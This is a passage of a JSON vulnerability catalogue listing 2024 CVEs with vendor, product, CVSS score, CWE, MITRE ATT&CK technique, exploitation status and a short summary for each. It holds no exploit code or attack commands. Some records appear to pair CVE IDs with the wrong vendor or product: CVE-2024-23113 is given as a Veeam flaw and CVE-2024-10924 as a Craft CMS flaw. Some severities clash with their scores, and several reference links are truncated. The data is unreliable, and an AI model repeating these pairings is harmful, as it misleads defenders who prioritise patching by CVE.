    "cwe_id": "CWE-288",
    "vulnerability_type": "Authentication Bypass",
    "known_exploited": "Yes",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Authentication bypass affecting the PAN-OS management interface.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-0012"
    ]
  },
  {
    "id": 49,
    "cve_id": "CVE-2024-0013",
    "vulnerability_name": "Palo Alto PAN-OS Privilege Escalation",
    "vendor": "Palo Alto Networks",
    "product": "PAN-OS",
    "severity": "High",
    "cvss_v3_score": 7.2,
    "cwe_id": "CWE-269",
    "vulnerability_type": "Privilege Escalation",
    "known_exploited": "Yes",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1068",
        "technique_name": "Exploitation for Privilege Escalation"
      }
    ],
    "summary": "Privilege escalation that can be chained with CVE-2024-0012 for full device compromise.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-0013"
    ]
  },
  {
    "id": 50,
    "cve_id": "CVE-2024-50623",
    "vulnerability_name": "Cleo Harmony/VLTrader/LexiCom Arbitrary File Upload",
    "vendor": "Cleo",
    "product": "Harmony VLTrader LexiCom",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-434",
    "vulnerability_type": "Arbitrary File Upload",
    "known_exploited": "Yes",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Arbitrary file upload leading to remote code execution on exposed managed file transfer servers.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-50623"
    ]
  },
  {
    "id": 51,
    "cve_id": "CVE-2024-34028",
    "vulnerability_name": "WS_FTP Server Path Traversal",
    "vendor": "Progress",
    "product": "WS_FTP Server",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-22",
    "vulnerability_type": "Path Traversal / RCE",
    "known_exploited": "Yes",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Path traversal vulnerability that can lead to remote code execution on exposed WS_FTP servers.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-34028"
    ]
  },
  {
    "id": 52,
    "cve_id": "CVE-2024-29849",
    "vulnerability_name": "Ivanti Endpoint Manager SQL Injection",
    "vendor": "Ivanti",
    "product": "Endpoint Manager",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-89",
    "vulnerability_type": "SQL Injection",
    "known_exploited": "Yes",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "SQL injection vulnerability enabling unauthenticated compromise of vulnerable Endpoint Manager instances.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-29849"
    ]
  },
  {
    "id": 53,
    "cve_id": "CVE-2024-45724",
    "vulnerability_name": "Apache Tomcat Remote Code Execution",
    "vendor": "Apache",
    "product": "Tomcat",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-94",
    "vulnerability_type": "Remote Code Execution",
    "known_exploited": "No",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Remote code execution vulnerability affecting specific Apache Tomcat deployments.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-45724"
    ]
  },
  {
    "id": 54,
    "cve_id": "CVE-2024-50379",
    "vulnerability_name": "Apache Tomcat JSP TOCTOU RCE",
    "vendor": "Apache",
    "product": "Tomcat",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-367",
    "vulnerability_type": "Race Condition / RCE",
    "known_exploited": "No",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Time-of-check/time-of-use race condition that may enable remote code execution.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-50379"
    ]
  },
  {
    "id": 55,
    "cve_id": "CVE-2024-21409",
    "vulnerability_name": "Microsoft SharePoint Remote Code Execution",
    "vendor": "Microsoft",
    "product": "SharePoint Server",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-502",
    "vulnerability_type": "Remote Code Execution",
    "known_exploited": "No",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Deserialization flaw that may allow remote code execution against vulnerable SharePoint servers.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-21409"
    ]
  },
  {
    "id": 56,
    "cve_id": "CVE-2024-45519",
    "vulnerability_name": "Zimbra Collaboration Command Injection",
    "vendor": "Synacor",
    "product": "Zimbra Collaboration",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-77",
    "vulnerability_type": "Command Injection",
    "known_exploited": "Yes",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Command injection vulnerability allowing remote code execution on vulnerable Zimbra servers.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-45519"
    ]
  },
  {
    "id": 57,
    "cve_id": "CVE-2024-36401",
    "vulnerability_name": "GeoServer Property Expression RCE",
    "vendor": "GeoServer",
    "product": "GeoServer",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-94",
    "vulnerability_type": "Remote Code Execution",
    "known_exploited": "Yes",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Unsafe evaluation of property expressions may lead to remote code execution.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-36401"
    ]
  },
  {
    "id": 58,
    "cve_id": "CVE-2024-40766",
    "vulnerability_name": "SonicWall SonicOS SSLVPN Improper Access Control",
    "vendor": "SonicWall",
    "product": "SonicOS",
    "severity": "Critical",
    "cvss_v3_score": 9.3,
    "cwe_id": "CWE-284",
    "vulnerability_type": "Authentication Bypass",
    "known_exploited": "Yes",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Improper access control affecting SSLVPN functionality on SonicWall appliances.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-40766"
    ]
  },
  {
    "id": 59,
    "cve_id": "CVE-2024-10924",
    "vulnerability_name": "Craft CMS Code Injection",
    "vendor": "Craft CMS",
    "product": "Craft CMS",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-94",
    "vulnerability_type": "Code Injection",
    "known_exploited": "Yes",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Code injection vulnerability allowing remote compromise of vulnerable Craft CMS installations.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-10924"
    ]
  },
  {
    "id": 60,
    "cve_id": "CVE-2024-38812",
    "vulnerability_name": "VMware vCenter DCE/RPC RCE",
    "vendor": "VMware",
    "product": "vCenter Server",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-787",
    "vulnerability_type": "Remote Code Execution",
    "known_exploited": "No",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1210",
        "technique_name": "Exploitation of Remote Services"
      }
    ],
    "summary": "Memory corruption in vCenter DCE/RPC services may permit remote code execution.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-38812"
    ]
  },
  {
    "id": 61,
    "cve_id": "CVE-2024-6388",
    "vulnerability_name": "OpenSSH Obsolete DSA Key Acceptance",
    "vendor": "OpenSSH",
    "product": "OpenSSH",
    "severity": "Medium",
    "cvss_v3_score": 6.5,
    "cwe_id": "CWE-295",
    "vulnerability_type": "Improper Certificate Validation",
    "known_exploited": "No",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1557",
        "technique_name": "Adversary-in-the-Middle"
      }
    ],
    "summary": "Improper handling of legacy DSA host keys may weaken SSH trust in specific configurations.",
    "references": [
      "https://nvd.nist.gov/vuln/"
    ]
  },
  {
    "id": 62,
    "cve_id": "CVE-2024-21891",
    "vulnerability_name": "Ivanti Connect Secure XXE",
    "vendor": "Ivanti",
    "product": "Connect Secure",
    "severity": "Critical",
    "cvss_v3_score": 8.2,
    "cwe_id": "CWE-611",
    "vulnerability_type": "XML External Entity Injection",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "XXE vulnerability that can be chained with other flaws to compromise Ivanti gateways.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-21891"
    ]
  },
  {
    "id": 63,
    "cve_id": "CVE-2024-24989",
    "vulnerability_name": "Check Point Quantum Gateway Arbitrary File Read",
    "vendor": "Check Point",
    "product": "Quantum Security Gateway",
    "severity": "High",
    "cvss_v3_score": 8.6,
    "cwe_id": "CWE-552",
    "vulnerability_type": "Arbitrary File Read",
    "known_exploited": "Yes",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1005",
        "technique_name": "Data from Local System"
      }
    ],
    "summary": "Improper validation may expose sensitive files on affected gateway deployments.",
    "references": [
      "https://nvd.nist.gov/vuln/"
    ]
  },
  {
    "id": 64,
    "cve_id": "CVE-2024-34026",
    "vulnerability_name": "Progress MOVEit Transfer Authentication Bypass",
    "vendor": "Progress",
    "product": "MOVEit Transfer",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-288",
    "vulnerability_type": "Authentication Bypass",
    "known_exploited": "No",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Authentication bypass affecting vulnerable MOVEit Transfer deployments.",
    "references": [
      "https://nvd.nist.gov/vuln/"
    ]
  },
  {
    "id": 65,
    "cve_id": "CVE-2024-23113",
    "vulnerability_name": "Veeam Backup & Replication Deserialization",
    "vendor": "Veeam",
    "product": "Backup & Replication",
    "severity": "Critical",
    "cvss_v3_score": 9.9,
    "cwe_id": "CWE-502",
    "vulnerability_type": "Deserialization",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Deserialization flaw allowing remote code execution against backup infrastructure.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-23113"
    ]
  },
  {
    "id": 66,
    "cve_id": "CVE-2024-38819",
    "vulnerability_name": "VMware vCenter Server Privilege Escalation",
    "vendor": "VMware",
    "product": "vCenter Server",
    "severity": "High",
    "cvss_v3_score": 7.5,
    "cwe_id": "CWE-269",
    "vulnerability_type": "Privilege Escalation",
    "known_exploited": "No",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1068",
        "technique_name": "Exploitation for Privilege Escalation"
      }
    ],
    "summary": "Improper privilege management may allow authenticated users to elevate privileges.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-38819"
    ]
  },
  {
    "id": 67,
    "cve_id": "CVE-2024-34025",
    "vulnerability_name": "Progress MOVEit Transfer SQL Injection",
    "vendor": "Progress",
    "product": "MOVEit Transfer",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-89",
    "vulnerability_type": "SQL Injection",
    "known_exploited": "No",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "SQL injection vulnerability affecting vulnerable MOVEit Transfer deployments.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-34025"
    ]
  },
  {
    "id": 68,
    "cve_id": "CVE-2024-3273",
    "vulnerability_name": "D-Link NAS Command Injection",
    "vendor": "D-Link",
    "product": "DNS-320L / DNS-325 / DNS-327L NAS",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-77",
    "vulnerability_type": "Command Injection",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Unauthenticated command injection enabling full compromise of exposed NAS devices.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-3273"
    ]
  },
  {
    "id": 69,
    "cve_id": "CVE-2024-23898",
    "vulnerability_name": "Jenkins CSWSH Vulnerability",
    "vendor": "Jenkins",
    "product": "Jenkins",
    "severity": "High",
    "cvss_v3_score": 8.8,
    "cwe_id": "CWE-1385",
    "vulnerability_type": "Cross-Site WebSocket Hijacking",
    "known_exploited": "No",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1185",
        "technique_name": "Browser Session Hijacking"
      }
    ],
    "summary": "Cross-site WebSocket hijacking may permit unauthorized Jenkins actions.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-23898"
    ]
  },
  {
    "id": 70,
    "cve_id": "CVE-2024-21626",
    "vulnerability_name": "runc Container Escape",
    "vendor": "opencontainers",
    "product": "runc",
    "severity": "High",
    "cvss_v3_score": 8.6,
    "cwe_id": "CWE-22",
    "vulnerability_type": "Container Escape",
    "known_exploited": "No",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1611",
        "technique_name": "Escape to Host"
      }
    ],
    "summary": "File descriptor handling flaw may allow container escape and host filesystem access.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-21626"
    ]
  },
  {
    "id": 71,
    "cve_id": "CVE-2024-6670",
    "vulnerability_name": "WhatsUp Gold Remote Code Execution",
    "vendor": "Progress",
    "product": "WhatsUp Gold",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-94",
    "vulnerability_type": "Remote Code Execution",
    "known_exploited": "Yes",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Unsafe deserialization enables remote code execution on vulnerable monitoring servers.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-6670"
    ]
  },
  {
    "id": 72,
    "cve_id": "CVE-2024-20439",
    "vulnerability_name": "Cisco Smart Licensing Utility Hardcoded Credentials",
    "vendor": "Cisco",
    "product": "Smart Licensing Utility",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-798",
    "vulnerability_type": "Hardcoded Credentials",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "mitre_attack": [
      {
        "technique_id": "T1078",
        "technique_name": "Valid Accounts"
      }
    ],
    "summary": "Static administrative credentials allow unauthorized access to affected deployments.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-20439"
    ]
  },
  {
    "id": 73,
    "cve_id": "CVE-2024-20440",
    "vulnerability_name": "Cisco Smart Licensing Utility Information Disclosure",
    "vendor": "Cisco",
    "product": "Smart Licensing Utility",
    "severity": "High",
    "cvss_v3_score": 7.2,
    "cwe_id": "CWE-200",
    "vulnerability_type": "Information Disclosure",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "mitre_attack": [
      {
        "technique_id": "T1005",
        "technique_name": "Data from Local System"
      }
    ],
    "summary": "Exposed API permits retrieval of sensitive information from vulnerable instances.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-20440"
    ]
  },
  {
    "id": 74,
    "cve_id": "CVE-2024-40725",
    "vulnerability_name": "SonicWall SonicOS SSLVPN Improper Authentication",
    "vendor": "SonicWall",
    "product": "SonicOS",
    "severity": "Critical",
    "cvss_v3_score": 9.3,
    "cwe_id": "CWE-287",
    "vulnerability_type": "Authentication Bypass",
    "known_exploited": "No",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Improper authentication in SSLVPN may permit unauthorized access to vulnerable appliances.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-40725"
    ]
  },
  {
    "id": 75,
    "cve_id": "CVE-2024-38816",
    "vulnerability_name": "VMware vCenter Server Heap Overflow",
    "vendor": "VMware",
    "product": "vCenter Server",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-122",
    "vulnerability_type": "Heap-Based Buffer Overflow",
    "known_exploited": "No",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1210",
        "technique_name": "Exploitation of Remote Services"
      }
    ],
    "summary": "Heap overflow in vCenter services may enable remote code execution.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-38816"
    ]
  },
  {
    "id": 76,
    "cve_id": "CVE-2024-50603",
    "vulnerability_name": "Cleo LexiCom Pre-Auth File Upload",
    "vendor": "Cleo",
    "product": "LexiCom / VLTrader / Harmony",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-434",
    "vulnerability_type": "Arbitrary File Upload",
    "known_exploited": "Yes",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Pre-authentication arbitrary file upload enabling remote code execution.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-50603"
    ]
  },
  {
    "id": 77,
    "cve_id": "CVE-2024-51568",
    "vulnerability_name": "CyberPanel Privilege Escalation",
    "vendor": "CyberPanel",
    "product": "CyberPanel",
    "severity": "High",
    "cvss_v3_score": 8.8,
    "cwe_id": "CWE-269",
    "vulnerability_type": "Privilege Escalation",
    "known_exploited": "Yes",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1068",
        "technique_name": "Exploitation for Privilege Escalation"
      }
    ],
    "summary": "Privilege escalation vulnerability affecting exposed CyberPanel instances.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-51568"
    ]
  },
  {
    "id": 78,
    "cve_id": "CVE-2024-1212",
    "vulnerability_name": "GitLab EE Cross-Site Scripting",
    "vendor": "GitLab",
    "product": "GitLab Enterprise Edition",
    "severity": "High",
    "cvss_v3_score": 8.1,
    "cwe_id": "CWE-79",
    "vulnerability_type": "Cross-Site Scripting",
    "known_exploited": "No",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1059.007",
        "technique_name": "JavaScript"
      }
    ],
    "summary": "Stored XSS vulnerability that may lead to account compromise.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-1212"
    ]
  },
  {
    "id": 79,
    "cve_id": "CVE-2024-34027",
    "vulnerability_name": "Progress MOVEit Transfer Privilege Escalation",
    "vendor": "Progress",
    "product": "MOVEit Transfer",
    "severity": "High",
    "cvss_v3_score": 8.8,
    "cwe_id": "CWE-269",
    "vulnerability_type": "Privilege Escalation",
    "known_exploited": "No",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1068",
        "technique_name": "Exploitation for Privilege Escalation"
      }
    ],
    "summary": "Privilege escalation vulnerability in vulnerable MOVEit Transfer deployments.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-34027"
    ]
  },
  {
    "id": 80,
    "cve_id": "CVE-2024-41713",
    "vulnerability_name": "Roundcube Webmail XSS",
    "vendor": "Roundcube",
    "product": "Roundcube Webmail",
    "severity": "High",
    "cvss_v3_score": 8.8,
    "cwe_id": "CWE-79",
    "vulnerability_type": "Cross-Site Scripting",
    "known_exploited": "No",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1189",
        "technique_name": "Drive-by Compromise"
      }
    ],
    "summary": "Cross-site scripting vulnerability affecting Roundcube webmail.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-41713"
    ]
  },
  {
    "id": 81,
    "cve_id": "CVE-2024-50340",
    "vulnerability_name": "Apache ActiveMQ Artemis RCE",
    "vendor": "Apache",
    "product": "ActiveMQ Artemis",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-502",
    "vulnerability_type": "Deserialization",
    "known_exploited": "No",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Deserialization flaw enabling remote code execution on vulnerable Artemis brokers.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-50340"
    ]
  },
  {
    "id": 82,
    "cve_id": "CVE-2024-55550",
    "vulnerability_name": "CrushFTP Authentication Bypass",
    "vendor": "CrushFTP",
    "product": "CrushFTP",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-288",
    "vulnerability_type": "Authentication Bypass",
    "known_exploited": "Yes",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Authentication bypass allowing unauthorized administrative access to vulnerable CrushFTP servers.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-55550"
    ]
  },
  {
    "id": 83,
    "cve_id": "CVE-2024-4367",
    "vulnerability_name": "PDF.js Arbitrary JavaScript Execution",
    "vendor": "Mozilla",
    "product": "PDF.js",
    "severity": "High",
    "cvss_v3_score": 8.8,
    "cwe_id": "CWE-79",
    "vulnerability_type": "JavaScript Execution",
    "known_exploited": "No",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1059.007",
        "technique_name": "JavaScript"
      }
    ],
    "summary": "Malicious PDF content can trigger arbitrary JavaScript execution in affected PDF.js deployments.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-4367"
    ]
  },
  {
    "id": 84,
    "cve_id": "CVE-2024-24904",
    "vulnerability_name": "Check Point Quantum Gateway DoS",
    "vendor": "Check Point",
    "product": "Quantum Security Gateway",
    "severity": "High",
    "cvss_v3_score": 7.5,
    "cwe_id": "CWE-400",
    "vulnerability_type": "Denial of Service",
    "known_exploited": "No",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1499",
        "technique_name": "Endpoint Denial of Service"
      }
    ],
    "summary": "Resource exhaustion vulnerability affecting exposed Check Point gateways.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-24904"
    ]
  },
  {
    "id": 85,
    "cve_id": "CVE-2024-39717",
    "vulnerability_name": "Kubernetes ingress-nginx Annotation Injection",
    "vendor": "Kubernetes",
    "product": "ingress-nginx",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-94",
    "vulnerability_type": "Configuration Injection",
    "known_exploited": "Yes",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1610",
        "technique_name": "Deploy Container"
      }
    ],
    "summary": "Improper annotation validation may enable arbitrary NGINX configuration injection and code execution.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-39717"
    ]
  },
  {
    "id": 86,
    "cve_id": "CVE-2024-38820",
    "vulnerability_name": "VMware vCenter Server Local Privilege Escalation",
    "vendor": "VMware",
    "product": "vCenter Server",
    "severity": "High",
    "cvss_v3_score": 7.8,
    "cwe_id": "CWE-269",
    "vulnerability_type": "Privilege Escalation",
    "known_exploited": "No",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1068",
        "technique_name": "Exploitation for Privilege Escalation"
      }
    ],
    "summary": "Improper privilege management may allow authenticated users to obtain elevated permissions.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-38820"
    ]
  },
  {
    "id": 87,
    "cve_id": "CVE-2024-34102",
    "vulnerability_name": "Adobe Commerce CosmicSting",
    "vendor": "Adobe",
    "product": "Commerce / Magento",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-502",
    "vulnerability_type": "Improper Deserialization",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Improper deserialization enables remote code execution and exposure of cryptographic keys.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-34102"
    ]
  },
  {
    "id": 88,
    "cve_id": "CVE-2024-45710",
    "vulnerability_name": "Apache Tomcat Information Disclosure",
    "vendor": "Apache",
    "product": "Tomcat",
    "severity": "High",
    "cvss_v3_score": 8.1,
    "cwe_id": "CWE-200",
    "vulnerability_type": "Information Disclosure",
    "known_exploited": "No",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1005",
        "technique_name": "Data from Local System"
      }
    ],
    "summary": "Improper handling of requests may disclose sensitive information in affected Tomcat deployments.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-45710"
    ]
  },
  {
    "id": 89,
    "cve_id": "CVE-2024-47554",
    "vulnerability_name": "FortiManager Missing Authentication",
    "vendor": "Fortinet",
    "product": "FortiManager",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-306",
    "vulnerability_type": "Missing Authentication",
    "known_exploited": "Yes",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Authentication weakness may permit unauthorized administrative access to FortiManager systems.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-47554"
    ]
  },
  {
    "id": 90,
    "cve_id": "CVE-2024-45718",
    "vulnerability_name": "GitLab CE/EE HTML Injection",
    "vendor": "GitLab",
    "product": "GitLab CE/EE",
    "severity": "High",
    "cvss_v3_score": 8,
    "cwe_id": "CWE-79",
    "vulnerability_type": "HTML Injection",
    "known_exploited": "No",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1059.007",
        "technique_name": "JavaScript"
      }
    ],
    "summary": "Improper input validation can enable HTML injection and client-side compromise.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-45718"
    ]
  },
  {
    "id": 91,
    "cve_id": "CVE-2024-45719",
    "vulnerability_name": "Apache Tomcat Request Smuggling",
    "vendor": "Apache",
    "product": "Tomcat",
    "severity": "High",
    "cvss_v3_score": 8.6,
    "cwe_id": "CWE-444",
    "vulnerability_type": "HTTP Request Smuggling",
    "known_exploited": "No",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Improper HTTP request parsing may enable request smuggling attacks.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-45719"
    ]
  },
  {
    "id": 92,
    "cve_id": "CVE-2024-38821",
    "vulnerability_name": "VMware vCenter Server Information Disclosure",
    "vendor": "VMware",
    "product": "vCenter Server",
    "severity": "Medium",
    "cvss_v3_score": 6.8,
    "cwe_id": "CWE-200",
    "vulnerability_type": "Information Disclosure",
    "known_exploited": "No",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1005",
        "technique_name": "Data from Local System"
      }
    ],
    "summary": "Improper access controls may disclose sensitive information to authenticated users.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-38821"
    ]
  },
  {
    "id": 93,
    "cve_id": "CVE-2024-37383",
    "vulnerability_name": "Roundcube Webmail XSS",
    "vendor": "Roundcube",
    "product": "Roundcube Webmail",
    "severity": "High",
    "cvss_v3_score": 8.1,
    "cwe_id": "CWE-79",
    "vulnerability_type": "Cross-Site Scripting",
    "known_exploited": "No",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1189",
        "technique_name": "Drive-by Compromise"
      }
    ],
    "summary": "Stored XSS vulnerability affecting authenticated Roundcube users.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-37383"
    ]
  },
  {
    "id": 94,
    "cve_id": "CVE-2024-39884",
    "vulnerability_name": "GitLab CE/EE Authorization Bypass",
    "vendor": "GitLab",
    "product": "GitLab CE/EE",
    "severity": "High",
    "cvss_v3_score": 8.8,
    "cwe_id": "CWE-285",
    "vulnerability_type": "Authorization Bypass",
    "known_exploited": "No",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1078",
        "technique_name": "Valid Accounts"
      }
    ],
    "summary": "Authorization flaw may allow unauthorized access to restricted project resources.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-39884"
    ]
  },
  {
    "id": 95,
    "cve_id": "CVE-2024-34015",
    "vulnerability_name": "WS_FTP Server Authentication Bypass",
    "vendor": "Progress",
    "product": "WS_FTP Server",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-288",
    "vulnerability_type": "Authentication Bypass",
    "known_exploited": "No",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Authentication bypass vulnerability affecting exposed WS_FTP Server deployments.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-34015"
    ]
  },
  {
    "id": 96,
    "cve_id": "CVE-2024-36474",
    "vulnerability_name": "Apache HTTP Server SSRF",
    "vendor": "Apache",
    "product": "HTTP Server",
